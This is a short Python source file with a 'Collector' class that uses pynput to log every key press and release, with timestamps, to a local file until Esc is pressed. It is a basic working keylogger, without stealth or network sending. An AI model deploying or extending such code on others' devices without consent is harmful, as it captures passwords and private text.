from pynput import keyboard
from datetime import datetime

class Collector:
    def __init__(self, logfile = "./logfile"):
        self.logfile = logfile
        self.logfilefd = None
        self.listener = None

    def on_press(self, key):
        try:
            self.inject_to_log(f"[*] Pressed: {key.char} at: {datetime.now()}")
        except AttributeError:
            self.inject_to_log(f"[*] Pressed: {key} at: {datetime.now()}")

    def on_release(self, key):
        try:
            self.inject_to_log(f"[*] Released: {key.char} at: {datetime.now()}")
        except AttributeError:
            self.inject_to_log(f"[*] Released: {key} at: {datetime.now()}")
        if key == keyboard.Key.esc:
            return False
    
    def inject_to_log(self, payload):
        self.logfilefd = open(self.logfile, "a")
        self.logfilefd.write(payload + "\n")
        self.logfilefd.close()

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press,on_release=self.on_release)
        self.listener.start()

    def join(self):
        self.listener.join()
        


